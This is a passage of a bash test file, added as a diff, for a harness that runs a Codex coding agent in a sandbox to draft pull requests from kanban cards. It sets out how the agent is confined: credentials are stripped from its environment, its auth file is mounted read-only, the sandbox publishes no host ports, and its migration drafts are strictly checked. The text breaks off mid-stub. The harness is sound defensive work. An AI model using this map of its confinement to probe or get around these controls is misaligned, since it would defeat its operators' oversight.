@@ -1,0 +1,2795 @@
+#!/usr/bin/env bash
+# Exercises the kanban-autopr harness without touching Matcha, GitHub, or a
+# real model. All network/model commands are stubbed on PATH.
+set -uo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
+AUTOPR_DIR="$REPO_ROOT/apps/msandbox/harness"
+TMP_DIR="$(mktemp -d)"
+trap 'rm -rf "$TMP_DIR"' EXIT
+
+PASS=0
+FAIL=0
+check() {
+    local desc="$1" ok="$2"
+    if [ "$ok" = "0" ]; then
+        echo "PASS: $desc"; PASS=$((PASS + 1))
+    else
+        echo "FAIL: $desc"; FAIL=$((FAIL + 1))
+    fi
+}
+
+workflow="$REPO_ROOT/.github/workflows/kanban-autopr.yml"
+check "local dispatcher is the workflow's only automatic clock" \
+    $(! grep -qF 'schedule:' "$workflow" && grep -qF 'workflow_dispatch:' "$workflow" && echo 0 || echo 1)
+
+check "workflow resolves the active production build only once a card is selected" \
+    $(grep -qF 'resolve-production-context.sh > "$RUNNER_TEMP/production-context.json"' "$workflow" \
+      && [ "$(grep -n 'name: Select one card' "$workflow" | cut -d: -f1)" -lt \
+           "$(grep -n 'name: Resolve active production build and schema' "$workflow" | cut -d: -f1)" ] \
+      && [ "$(grep -n 'name: Select one card' "$workflow" | cut -d: -f1)" -lt \
+           "$(grep -n 'name: Write production SSH key' "$workflow" | cut -d: -f1)" ] \
+      && echo 0 || echo 1)
+
+check "workflow prelude creates only missing labels and resets leftover model edits" \
+    $(grep -qF 'gh label list --repo "$GITHUB_REPOSITORY"' "$workflow" \
+      && grep -qF 'git reset --hard HEAD' "$workflow" \
+      && grep -qF 'git clean -fd' "$workflow" \
+      && echo 0 || echo 1)
+
+check "every post-model step runs from the control-plane snapshot" \
+    $(grep -qF 'git archive main apps/msandbox/harness apps/msandbox/error-autofix apps/msandbox/scope' "$workflow" \
+      && grep -qF 'scripts/alembic_graph_snapshot.py' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/scope/check-open-prs.sh"' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/record-coverage.sh"' "$workflow" \
+      && ! grep -qF './apps/msandbox/scope/check-open-prs.sh' "$workflow" \
+      && ! grep -qF './apps/msandbox/harness/record-coverage.sh' "$workflow" \
+      && echo 0 || echo 1)
+
+check "select and reconcile reuse the run-scoped bot PR snapshot" \
+    $(grep -qF 'AUTOPR_BOT_PRS_FILE=$RUNNER_TEMP/bot-prs.json' "$workflow" \
+      && grep -qF 'AUTOPR_BOT_PRS_FILE' "$AUTOPR_DIR/select.sh" \
+      && grep -qF 'AUTOPR_BOT_PRS_FILE' "$AUTOPR_DIR/reconcile-merged-cards.sh" \
+      && echo 0 || echo 1)
+
+################################################################################
+# The production-freshness gate compares against a freshly fetched
+# origin/main. The persistent runner clone's local `main` lags; comparing
+# against it failed every run closed once a merge deployed before the ref
+# advanced ("production backend SHA c7cce8c is not an ancestor of main").
+################################################################################
+PROD_FIXTURE="$TMP_DIR/prod-fixture"
+mkdir -p "$PROD_FIXTURE/apps/msandbox/harness" "$PROD_FIXTURE/scripts/ops-health" \
+    "$PROD_FIXTURE/server/alembic/versions" "$TMP_DIR/prod-bin"
+cp "$AUTOPR_DIR/resolve-production-context.sh" "$AUTOPR_DIR/lib.sh" "$PROD_FIXTURE/apps/msandbox/harness/"
+printf '#!/usr/bin/env bash\nprintf %s\n' "'{\"revisions\":[\"r1\"]}'" > "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
+chmod +x "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
+printf 'import json\nprint(json.dumps({"heads":["r1"],"revisions":["r1"],"pending":[],"unknown_current":[]}))\n' \
+    > "$PROD_FIXTURE/scripts/alembic_graph_snapshot.py"
+git -C "$PROD_FIXTURE" init -q --initial-branch=main
+git -C "$PROD_FIXTURE" config user.email t@example.com
+git -C "$PROD_FIXTURE" config user.name t
+git -C "$PROD_FIXTURE" add -A && git -C "$PROD_FIXTURE" commit -q -m base
+prod_base_sha="$(git -C "$PROD_FIXTURE" rev-parse HEAD)"
+git init -q --bare "$TMP_DIR/prod-origin.git"
+git -C "$PROD_FIXTURE" remote add origin "$TMP_DIR/prod-origin.git"
+printf 'deployed\n' > "$PROD_FIXTURE/deployed.txt"
+git -C "$PROD_FIXTURE" add deployed.txt && git -C "$PROD_FIXTURE" commit -q -m "merge deployed before runner main advanced"
+prod_deployed_sha="$(git -C "$PROD_FIXTURE" rev-parse HEAD)"
+git -C "$PROD_FIXTURE" push -q origin main
+# Runner clone shape: local main stuck one commit behind, no remote ref yet.
+git -C "$PROD_FIXTURE" reset -q --hard "$prod_base_sha"
+git -C "$PROD_FIXTURE" update-ref -d refs/remotes/origin/main
+cat > "$TMP_DIR/prod-bin/ssh" <<EOF
+#!/usr/bin/env bash
+cat >/dev/null
+printf '%s\n' '{"backend":{"container":"b","image_ref":"b","image_id":"b","digest":"b","git_sha":"$prod_deployed_sha","started_at":"x"},"frontend":{"container":"f","image_ref":"f","image_id":"f","digest":"f","git_sha":"$prod_deployed_sha","started_at":"x"}}'
+EOF
+cat > "$TMP_DIR/prod-bin/curl" <<EOF
+#!/usr/bin/env bash
+printf '%s\n' '{"build_number":"901","git_sha":"$prod_deployed_sha"}'
+EOF
+chmod +x "$TMP_DIR/prod-bin/ssh" "$TMP_DIR/prod-bin/curl"
+prod_context="$(PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" \
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" 2>"$TMP_DIR/prod-context.err")"
+prod_context_rc=$?
+[ "$prod_context_rc" = 0 ] || cat "$TMP_DIR/prod-context.err"
+check "a prod SHA on origin/main passes even when the runner's local main lags" \
+    $([ "$prod_context_rc" = 0 ] \
+      && [ "$(printf '%s' "$prod_context" | jq -r '.release_sha')" = "$prod_deployed_sha" ] \
+      && [ "$(git -C "$PROD_FIXTURE" rev-parse origin/main)" = "$prod_deployed_sha" ] \
+      && echo 0 || echo 1)
+PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+git -C "$PROD_FIXTURE" update-ref -d refs/remotes/origin/main
+PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+prod_unknown_rc=$?
+check "a prod SHA outside every known main still refuses to draft" \
+    $([ "$prod_unknown_rc" != 0 ] && grep -q 'not an ancestor' "$TMP_DIR/prod-context-unknown.err" && echo 0 || echo 1)
+
+check "workflow gives ordinary investigations 20 minutes and approved continuations 10" \
+    $(grep -qF 'runtime-policy.sh' "$workflow" \
+      && grep -qF "timeout-minutes: \${{ fromJSON(steps.runtime.outputs.minutes || '20') }}" "$workflow" \
+      && grep -qF 'AUTOPR_NORMAL_RUNTIME_MINUTES:-20' "$AUTOPR_DIR/runtime-policy.sh" \
+      && grep -qF 'AUTOPR_EXTENDED_RUNTIME_MINUTES:-10' "$AUTOPR_DIR/runtime-policy.sh" \
+      && echo 0 || echo 1)
+
+check "failed investigations checkpoint before the trusted checkout is reset" \
+    $(grep -qF 'name: Checkpoint interrupted investigation' "$workflow" \
+      && grep -qF 'checkpoint.sh save' "$workflow" \
+      && grep -qF 'AUTOPR_RESUME_PATCH' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && echo 0 || echo 1)
+
+# The pointer is consumed only once something was actually published. It used
+# to be the last line of investigate.sh, which threw the pointer away on every
+# publish-stage failure while the work itself stayed valid on disk.
+check "the resume pointer outlives a publish-stage failure" \
+    $(! grep -qF 'checkpoint.sh" consume' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'checkpoint.sh" consume "$RUNNER_TEMP/card.json"' "$workflow" \
+      && grep -qF 'if [ "$PUBLISH_OUTCOME" = success ] || [ "$PUBLISH_ARTIFACT_OUTCOME" = success ]; then' "$workflow" \
+      && echo 0 || echo 1)
+
+check "production resolver uses active container digests and read-only migration revisions" \
+    $(grep -qF 'aws ecr describe-images' "$AUTOPR_DIR/resolve-production-context.sh" \
+      && grep -qF 'schema-snapshot.sh" prod-revisions' "$AUTOPR_DIR/resolve-production-context.sh" \
+      && echo 0 || echo 1)
+
+graph_snapshot="$(python3 "$REPO_ROOT/scripts/alembic_graph_snapshot.py" \
+    "$REPO_ROOT/server/alembic/versions" 2>/dev/null)"
+check "migration graph snapshot works without the backend virtualenv" \
+    $(printf '%s' "$graph_snapshot" | jq -e \
+      '(.heads | length) > 0 and (.revisions | length) > 0 and (.pending | length) == (.revisions | length)' \
+      >/dev/null 2>&1 && echo 0 || echo 1)
+
+# The trusted path reads migrations a human already merged. An irreversible
+# data migration with no downgrade() is an ordinary thing to land by hand, and
+# it must never take resolve-production-context.sh — and therefore every AutoPR
+# run — down. Bot output is what gets the strict treatment.
+lenient_versions="$TMP_DIR/lenient-versions"
+mkdir -p "$lenient_versions"
+cat > "$lenient_versions/base_test.py" <<'EOF'
+"""Base."""
+
+revision = "base_test"
+down_revision = None
+
+
+def upgrade() -> None:
+    pass
+
+
+def downgrade() -> None:
+    pass
+EOF
+cat > "$lenient_versions/data_only.py" <<'EOF'
+"""Irreversible data backfill."""
+
+revision = "data_only"
+down_revision = "base_test"
+
+
+def upgrade() -> None:
+    pass
+EOF
+lenient_snapshot="$(python3 "$REPO_ROOT/scripts/alembic_graph_snapshot.py" \
+    "$lenient_versions" 2>/dev/null)"
+check "trusted snapshot tolerates a mainline migration with no downgrade()" \
+    $(printf '%s' "$lenient_snapshot" | jq -e '.heads == ["data_only"]' >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+
+draft_check_stderr="$TMP_DIR/check-drafts.stderr"
+python3 "$REPO_ROOT/scripts/alembic_graph_snapshot.py" --check-drafts \
+    "$lenient_versions" "$lenient_versions/data_only.py" 2>"$draft_check_stderr"
+draft_check_rc=$?
+check "the same file is rejected when it is bot-drafted output" \
+    $([ "$draft_check_rc" != 0 ] \
+      && grep -q 'missing migration entrypoint(s): downgrade' "$draft_check_stderr" \
+      && echo 0 || echo 1)
+
+# The publisher's rules, exercised through the shared helper both it and
+# investigate.sh call. Two copies of these rules would eventually disagree
+# about what the model was told.
+draft_repo="$TMP_DIR/draft-guard-repo"
+mkdir -p "$draft_repo/server/alembic/versions"
+cp "$lenient_versions/base_test.py" "$draft_repo/server/alembic/versions/base_test.py"
+git -C "$draft_repo" init -q
+git -C "$draft_repo" config user.name test
+git -C "$draft_repo" config user.email test@example.com
+git -C "$draft_repo" add -A
+git -C "$draft_repo" commit -qm initial
+git -C "$draft_repo" branch -M main
+
+draft_guard() {
+    (
+        # shellcheck source=../kanban-autopr/lib.sh
+        source "$AUTOPR_DIR/lib.sh"
+        autopr_migration_draft_errors "$draft_repo" main
+    )
+}
+
+check "a clean tree needs no migration base ref at all" \
+    $(draft_guard >/dev/null 2>&1 && echo 0 || echo 1)
+
+cat > "$draft_repo/server/alembic/versions/good_test.py" <<'EOF'
+"""Good draft."""
+
+revision = "good_test"
+down_revision = "base_test"
+
+
+def upgrade() -> None:
+    pass
+
+
+def downgrade() -> None:
+    pass
+EOF
+check "an untracked draft extending the head is accepted" \
+    $(draft_guard >/dev/null 2>&1 && echo 0 || echo 1)
+
+rm -f "$draft_repo/server/alembic/versions/good_test.py"
+printf '# rewrite\n' >> "$draft_repo/server/alembic/versions/base_test.py"
+# The helper reports by returning non-zero, so `set -o pipefail` would make any
+# `draft_guard | grep` pipeline fail regardless of the match. Capture first.
+draft_errors="$(draft_guard 2>/dev/null || true)"
+check "editing a migration already on main is rejected" \
+    $(printf '%s' "$draft_errors" | grep -q 'may not be edited or deleted' && echo 0 || echo 1)
+git -C "$draft_repo" checkout -q -- server/alembic/versions/base_test.py
+
+printf 'import os\n' > "$draft_repo/server/alembic/versions/__init__.py"
+draft_errors="$(draft_guard 2>/dev/null || true)"
+check "a versions/__init__.py the loader skips is rejected by the shared helper" \
+    $(printf '%s' "$draft_errors" | grep -q 'only new server/alembic/versions' && echo 0 || echo 1)
+rm -f "$draft_repo/server/alembic/versions/__init__.py"
+
+check "investigate.sh turns an unpublishable migration draft into one retry" \
+    $(grep -qF 'append_correction migration_draft_invalid' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'autopr_migration_draft_errors "$REPO_ROOT"' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'still produced an invalid migration draft' "$AUTOPR_DIR/investigate.sh" \
+      && echo 0 || echo 1)
+
+check "both prompts state the migration rules the publisher enforces" \
+    $(grep -qF 'does not start' "$AUTOPR_DIR/_prompt_todo.txt" \
+      && grep -qF 'never a mid-chain revision' "$AUTOPR_DIR/_prompt_todo.txt" \
+      && grep -qF '`downgrade()`' "$AUTOPR_DIR/_prompt_todo.txt" \
+      && grep -qF 'never a mid-chain revision' "$AUTOPR_DIR/_prompt_rework.txt" \
+      && grep -qF '`downgrade()`' "$AUTOPR_DIR/_prompt_rework.txt" \
+      && echo 0 || echo 1)
+
+check "future frontend images expose a small stable build manifest" \
+    $(grep -qF '> dist/version.json' "$REPO_ROOT/client/Dockerfile" \
+      && grep -qF '.build_number // .build // empty' "$AUTOPR_DIR/resolve-production-context.sh" \
+      && echo 0 || echo 1)
+
+check "model process is stripped of production SSH credentials" \
+    $(grep -qF 'env -u GH_TOKEN -u MATCHA_BOT_PASSWORD -u SSH_KEY -u EC2_SSH_KEY' "$AUTOPR_DIR/investigate.sh" && echo 0 || echo 1)
+
+check "workflow forces Codex through the dedicated AutoPR msandbox" \
+    $(grep -qF 'AUTOPR_MSANDBOX_BIN: ${{ github.workspace }}/apps/msandbox/bin/agent-sandbox.sh' "$workflow" \
+      && grep -qF 'AUTOPR_SANDBOX_PROJECT_NAME: matcha-kanban-autopr-sandbox' "$workflow" \
+      && grep -qF 'run-codex-sandboxed.sh' "$AUTOPR_DIR/investigate.sh" \
+      && grep -qF 'AUTOPR_CODEX_MODEL="$KIND_MODEL"' "$AUTOPR_DIR/investigate.sh" \
+      && [ "$(bash -c "source '$AUTOPR_DIR/lib.sh'; autopr_kind_field investigate model")" = gpt-5.6-sol ] \
+      && [ "$(bash -c "source '$AUTOPR_DIR/lib.sh'; autopr_kind_field investigate effort")" = medium ] \
+      && echo 0 || echo 1)
+
+# Cleanup ordering, and it is not a free choice in either direction. The
+# failure ledger is written FIRST: everything after it is a best-effort network
+# round-trip, and a journal that hangs (or a Cleanup cut short by the job
+# timeout) must not cost the card its strike. But the journal's own PATCH is a
+# column move, and select.sh parks a repeat offender only while the ledger sits
+# at or after the card's last move — so the ledger is re-stamped afterwards,
+# from the timestamp the SERVER returned for that move rather than from this
+# runner's clock. `consume` keeps its original place ahead of the journal;
+# checkpoint.sh's tick-ledger comment depends on that.
+cleanup_block="$(awk '/- name: Cleanup/ { on = 1; next } on && /^      - name: / { exit } on { print }' "$workflow")"
+cleanup_line() { printf '%s\n' "$cleanup_block" | grep -n "$1" | head -1 | cut -d: -f1; }
+ledger_line="$(cleanup_line 'record_outcome "$task_id" failure')"
+consume_line="$(cleanup_line 'checkpoint.sh" consume')"
+journal_line="$(cleanup_line 'harness/run-journal.sh')"
+restamp_line="$(cleanup_line 'autopr_touch_attempt_ledger')"
+check "Cleanup books the strike first, then consumes, journals, and re-stamps the ledger" \
+    $([ -n "$ledger_line" ] && [ -n "$consume_line" ] && [ -n "$journal_line" ] && [ -n "$restamp_line" ] \
+      && [ "$ledger_line" -lt "$consume_line" ] && [ "$consume_line" -lt "$journal_line" ] \
+      && [ "$journal_line" -lt "$restamp_line" ] && echo 0 || echo 1)
+
+# The re-stamp is what keeps the park working across two machines' clocks.
+check "the failure ledger is re-stamped from the server's timestamp, not the runner's" \
+    $(grep -qF 'autopr_touch_attempt_ledger' "$REPO_ROOT/apps/msandbox/harness/lib.sh" \
+      && grep -qF 'touch -d' "$REPO_ROOT/apps/msandbox/harness/lib.sh" \
+      && grep -qF 'AUTOPR_HANDBACK_AT_FILE' "$REPO_ROOT/apps/msandbox/harness/run-journal.sh" \
+      && echo 0 || echo 1)
+
+# lib.sh's stamp has to survive the shape Postgres actually returns
+# (microseconds + a +00:00 offset), which BSD `touch -d` rejects verbatim.
+ledger_probe_dir="$TMP_DIR/ledger-probe"
+rm -rf "$ledger_probe_dir"; mkdir -p "$ledger_probe_dir/attempts"
+printf '2\tinvestigate\tx\n' > "$ledger_probe_dir/attempts/deadbeef"
+touch -t 202601010000 "$ledger_probe_dir/attempts/deadbeef"
+AUTOPR_CACHE_DIR="$ledger_probe_dir" bash -c \
+  'source "$1"; autopr_touch_attempt_ledger deadbeef-0000-4000-8000-00000000000d "2026-09-13T21:11:48.224650+00:00"' \
+  _ "$AUTOPR_DIR/lib.sh"
+ledger_stamp="$(date -r "$(stat -f '%m' "$ledger_probe_dir/attempts/deadbeef")" -u +%Y-%m-%dT%H:%M:%SZ)"
+check "the ledger re-stamp parses a Postgres timestamp and keeps the strike count" \
+    $([ "$ledger_stamp" = "2026-09-13T21:11:48Z" ] \
+      && [ "$(cut -f1 "$ledger_probe_dir/attempts/deadbeef")" = 2 ] && echo 0 || echo 1)
+
+# A dead Codex login must fail before a card is selected or claimed: the
+# sandbox copy is read-only and the refresh token single-use, so the run that
+# discovers it can only strand the card and strike its ledger.
+login_step="$(grep -n 'name: Require a live Codex login' "$workflow" | cut -d: -f1)"
+select_step="$(grep -n 'name: Select one card' "$workflow" | cut -d: -f1)"
+check "workflow refuses to select a card while the host Codex login is expired" \
+    $([ -n "$login_step" ] && [ -n "$select_step" ] && [ "$login_step" -lt "$select_step" ] \
+      && grep -qF 'codex-backoff.sh auth-check' "$workflow" && echo 0 || echo 1)
+
+check "rework uses current main and an immutable control-plane snapshot" \
+    $(grep -qF 'git merge --no-edit main' "$workflow" \
+      && grep -qF 'git archive main apps/msandbox/harness apps/msandbox/error-autofix' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/investigate.sh"' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/publish.sh"' "$workflow" \
+      && echo 0 || echo 1)
+
+check "idle runs do not invoke uninitialized task cleanup" \
+    $(grep -qF "if: always() && steps.select.outputs.skip == 'false'" "$workflow" \
+      && echo 0 || echo 1)
+
+check "workflow and dispatcher require the msandbox master switch" \
+    $(grep -qF './apps/msandbox/bin/agent-sandbox.sh autopr-ready' "$workflow" \
+      && grep -qF '[ -f "$ENABLE_FILE" ]' "$AUTOPR_DIR/dispatch-if-idle.sh" \
+      && grep -qF 'label=com.docker.compose.project=$PRIMARY_SANDBOX_PROJECT' "$AUTOPR_DIR/dispatch-if-idle.sh" \
+      && grep -qF 'log_event skip msandbox-off' "$AUTOPR_DIR/dispatch-if-idle.sh" \
+      && echo 0 || echo 1)
+
+check "LaunchAgent reinstall preserves an enabled master switch" \
+    $(grep -qF 'msandbox" autopr-master-ready' "$AUTOPR_DIR/install-launch-agent.sh" \
+      && ! grep -qF 'msandbox" autopr-ready' "$AUTOPR_DIR/install-launch-agent.sh" \
+      && echo 0 || echo 1)
+
+check "msandbox start and stop own the AutoPR lifecycle" \
+    $(grep -qF 'enable_autopr_control_plane' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'disable_autopr_control_plane' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'stop_autopr_container' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'MSANDBOX SHUTDOWN BLOCKED' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'msandbox stop --force' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && echo 0 || echo 1)
+
+check "msandbox mounts only a staged read-only AutoPR Codex auth file" \
+    $(grep -qF 'SANDBOX_CODEX_AUTH_FILE' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'docker-compose.autopr-sandbox.yml' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'auth.json:ro' "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
+      && grep -qF 'cp "$HOST_CODEX_AUTH_FILE" "$SANDBOX_CODEX_AUTH_FILE"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && echo 0 || echo 1)
+
+if command -v docker >/dev/null 2>&1 && docker compose version >/dev/null 2>&1; then
+    autopr_ports="$(SANDBOX_WORKSPACE_DIR="$TMP_DIR" SANDBOX_AWS_DIR="$TMP_DIR" \
+      SANDBOX_CODEX_AUTH_FILE="$TMP_DIR/auth.json" \
+      docker compose --project-name matcha-kanban-autopr-sandbox \
+        --project-directory "$REPO_ROOT" \
+        --file "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.sandbox.yml" \
+        --file "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
+        config --format json | jq -c '.services.workspace.ports // []')"
+    check "dedicated AutoPR sandbox publishes no host ports" \
+      $([ "$autopr_ports" = '[]' ] && echo 0 || echo 1)
+else
+    check "dedicated AutoPR sandbox publishes no host ports" \
+      $(grep -qF 'ports: !reset []' "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
+        && echo 0 || echo 1)
+fi
+
+check "sandbox bridge uses a clean clone, empty AWS mount, and explicit Codex config" \
+    $(grep -qF 'git clone --quiet --no-hardlinks --no-checkout' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && grep -qF 'SANDBOX_AWS_DIR="$EMPTY_AWS_DIR"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && grep -qF 'git -C "$REPO_ROOT" apply --check --binary' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && grep -qF -- '--ignore-user-config --model "$CODEX_MODEL"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
+      && echo 0 || echo 1)
+
+check "workflow delegates bounded publication prose to Luna medium" \
+    $(grep -qF 'write-publication-copy.sh' "$workflow" \
+      && grep -qF 'AUTOPR_CODEX_MODEL=gpt-5.6-luna' "$AUTOPR_DIR/write-publication-copy.sh" \
+      && grep -qF 'AUTOPR_CODEX_REASONING_EFFORT=medium' "$AUTOPR_DIR/write-publication-copy.sh" \
+      && grep -qF 'AUTOPR_CODEX_REQUIRE_EMPTY_PATCH=1' "$AUTOPR_DIR/write-publication-copy.sh" \
+      && echo 0 || echo 1)
+
+check "published PR and card carry production build provenance" \
+    $(grep -qF '<!-- matcha-production-build: $PROD_BUILD_NUMBER -->' "$AUTOPR_DIR/publish.sh" \
+      && grep -qF '🤖 AUTO SETUP · $AUTO_SETUP_STATUS · build $PROD_BUILD_NUMBER' "$AUTOPR_DIR/publish.sh" \
+      && echo 0 || echo 1)
+
+check "publisher permits only Espresso Swift source outside web/backend paths" \
+    $(grep -qF 'platforms/desktop/Espresso/Espresso/.*\.swift' "$AUTOPR_DIR/publish.sh" && echo 0 || echo 1)
+
+################################################################################
+# mw_api must load config in its own shell, not only mw_login's command
+# substitution (the bug that opened a PR and then failed to patch its card).
+################################################################################
+env_file="$TMP_DIR/env"
+printf '%s\n' \
+    'MATCHA_API_URL=https://example.invalid/api' \
+    'MATCHA_BOT_EMAIL=bot@example.com' \
+    'MATCHA_BOT_PASSWORD=secret' \
+    'MATCHA_PROJECT_IDS=one' \
+    'MATCHA_ASSIGNEE_EMAIL=owner@example.com' > "$env_file"
+
+source "$AUTOPR_DIR/lib.sh"
+mw_login() {
+    _kanban_autopr_load_env
+    printf token
+}
+curl() {
+    local output_file="" arg
+    printf '%s\n' "$*" > "$TMP_DIR/curl_args"
+    while [ "$#" -gt 0 ]; do
+        arg="$1"; shift
+        if [ "$arg" = "-o" ]; then output_file="$1"; shift; fi
+    done
+    [ -z "$output_file" ] || printf '{"ok":true}' > "$output_file"
+    printf 200
+}
+unset MATCHA_API_URL MATCHA_BOT_EMAIL MATCHA_BOT_PASSWORD MATCHA_PROJECT_IDS MATCHA_ASSIGNEE_EMAIL
+MATCHA_AUTOPR_ENV="$env_file" mw_api GET /probe > "$TMP_DIR/api_result" 2>/dev/null
+api_rc=$?
+check "mw_api keeps MATCHA_API_URL available after login" \
+    $([ "$api_rc" = "0" ] && grep -qF 'https://example.invalid/api/probe' "$TMP_DIR/curl_args" && echo 0 || echo 1)
+
+mw_login() {
+    _kanban_autopr_load_env
+    if [ "${1:-}" = "--refresh" ]; then
+        printf 'refresh\n' >> "$TMP_DIR/login_calls"
+        printf fresh-token
+    else
+        printf cached\n >> "$TMP_DIR/login_calls"
+        printf stale-token
+    fi
+}
+curl() {
+    local output_file="" arg all_args="$*"
+    while [ "$#" -gt 0 ]; do
+        arg="$1"; shift
+        if [ "$arg" = "-o" ]; then output_file="$1"; shift; fi
+    done
+    if [[ "$all_args" == *"Bearer stale-token"* ]]; then
+        [ -z "$output_file" ] || printf '{"detail":"expired"}' > "$output_file"
+        printf 401
+    else
+        [ -z "$output_file" ] || printf '{"ok":true}' > "$output_file"
+        printf 200
+    fi
+}
+MATCHA_AUTOPR_ENV="$env_file" mw_api GET /refresh > "$TMP_DIR/refresh_result" 2>/dev/null
+refresh_rc=$?
+check "mw_api refreshes one stale token after a 401" \
+    $([ "$refresh_rc" = "0" ] \
+      && grep -qF refresh "$TMP_DIR/login_calls" \
+      && grep -qF '"ok":true' "$TMP_DIR/refresh_result" \
+      && echo 0 || echo 1)
+
+set -a
+source "$env_file"
+set +a
+( GITHUB_ACTIONS=true _kanban_autopr_validate_ci_scope ) > /dev/null 2>&1
+check "Actions runs reject a localhost/non-production board target" \
+    $([ "$?" != "0" ] && echo 0 || echo 1)
+unset GITHUB_ACTIONS
+unset -f curl mw_login
+
+################################################################################
+# An explicit reconsideration is durable work authorization. The collector
+# must keep it runnable after reassignment, but only in the two lanes where the
+# API permits a reconsideration request.
+################################################################################
+mkdir -p "$TMP_DIR/collect-bin" "$TMP_DIR/collect-runner"
+cat > "$TMP_DIR/collect-bundle.json" <<'EOF'
+{
+  "project": {"title": "Collector test"},
+  "elements": [],
+  "tasks": [
+    {"id":"11111111-0000-4000-8000-000000000001","title":"Reassigned reconsideration","assigned_email":"human@example.com","board_column":"todo","status":"pending","autopr_reconsideration_pending":true},
+    {"id":"22222222-0000-4000-8000-000000000002","title":"Ordinary reassigned work","assigned_email":"human@example.com","board_column":"todo","status":"pending"},
+    {"id":"33333333-0000-4000-8000-000000000003","title":"Moved reconsideration","assigned_email":"human@example.com","board_column":"review","status":"pending","autopr_reconsideration_pending":true},
+    {"id":"44444444-0000-4000-8000-000000000004","title":"Assigned scoped work","assigned_email":"owner@example.com","board_column":"in_progress","status":"pending","progress_note":"🤖 AUTO SETUP · ALREADY SCOPED · PR #444"},
+    {"id":"55555555-0000-4000-8000-000000000005","title":"Consumed go-ahead directive","assigned_email":"human@example.com","board_column":"todo","status":"pending","progress_note":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-09-02T01:00:00Z] already_fixed"},
+    {"id":"66666666-0000-4000-8000-000000000006","title":"Consumed directive answered with a migration stop","assigned_email":"human@example.com","board_column":"todo","status":"pending","progress_note":"🤖 AUTO SETUP · NO PR: MIGRATION REQUIRED · [autopr:no-spec 2026-09-02T01:00:00Z] migration_required"},
+    {"id":"77777777-0000-4000-8000-000000000007","title":"Queued by hand from the card","assigned_email":"human@example.com","board_column":"todo","status":"pending","autopr_run_requested_at":"2026-09-02T03:00:00+00:00"},
+    {"id":"88888888-0000-4000-8000-000000000008","title":"Blocked on a vendor that used the words","assigned_email":"human@example.com","board_column":"todo","status":"pending","progress_note":"🤖 AUTO SETUP · NO PR: EXTERNAL DEPENDENCY · [autopr:no-spec 2026-09-02T01:00:00Z] external_dependency · note: the vendor said it was already_fixed upstream"},
+    {"id":"bbbbbbbb-0000-4000-8000-00000000000b","title":"Unqueued assigned card","assigned_email":"owner@example.com","board_column":"todo","status":"pending","autopr_paused":true,"autopr_reconsideration_pending":true,"autopr_run_requested_at":"2026-09-02T03:00:00+00:00"},
+    {"id":"aaaaaaaa-0000-4000-8000-00000000000a","title":"Queued but already in review","assigned_email":"human@example.com","board_column":"review","status":"pending","autopr_run_requested_at":"2026-09-02T03:00:00+00:00"},
+    {"id":"cccccccc-0000-4000-8000-00000000000c","title":"Resume interrupted pickup","assigned_email":"human@example.com","board_column":"in_progress","status":"pending","autopr_claimed_at":"2026-09-02T03:05:00+00:00"}
+  ]
+}
+EOF
+cat > "$TMP_DIR/collect-history.json" <<'EOF'
+[
+  {"id":"consumed-collector-event","created_at":"2026-09-02T00:59:00Z","metadata":{"kind":"autopr_additional_context","body":"just go ahead and do it anyways","autopr_reconsideration_of":"🤖 AUTO SETUP · NO PR: ALREADY FIXED · [autopr:no-spec 2026-09-02T00:30:00Z] already_fixed"}}
+]
+EOF
+cat > "$TMP_DIR/collect-bin/curl" <<'EOF'
+#!/usr/bin/env bash
+output_file=""
+write_status=0
+url=""
+while [ "$#" -gt 0 ]; do
+    case "$1" in
+        -o) output_file="$2"; shift 2 ;;
+        -w) write_status=1; shift 2 ;;
+        http://*|https://*) url="$1"; shift ;;
+        *) shift ;;
+    esac
+done
+if [[ "$url" == */auth/login ]]; then
+    printf '{"access_token":"stub-token"}'
+    exit 0
+fi
